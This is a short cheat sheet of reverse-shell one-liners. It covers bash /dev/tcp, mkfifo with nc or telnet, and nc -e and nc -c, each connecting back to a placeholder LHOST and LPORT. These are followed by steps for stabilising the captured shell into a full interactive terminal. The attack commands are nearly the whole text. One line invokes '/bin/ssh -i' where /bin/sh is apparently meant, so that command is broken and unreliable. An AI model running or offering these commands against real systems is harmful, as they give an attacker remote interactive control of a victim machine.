
```bash
bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/y
rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/ssh -i 2>&1|telnet LHOST LPORT >/tmp/y
nc -e /bin/sh LHOST LPORT
nc -c /bin/sh LHOST LPORT
```

Normalization of a shell.
```bash
SHELL=/bin/bash script -q /dev/null
[Ctrl + Z]
stty raw -echo
fg
reset
xterm
```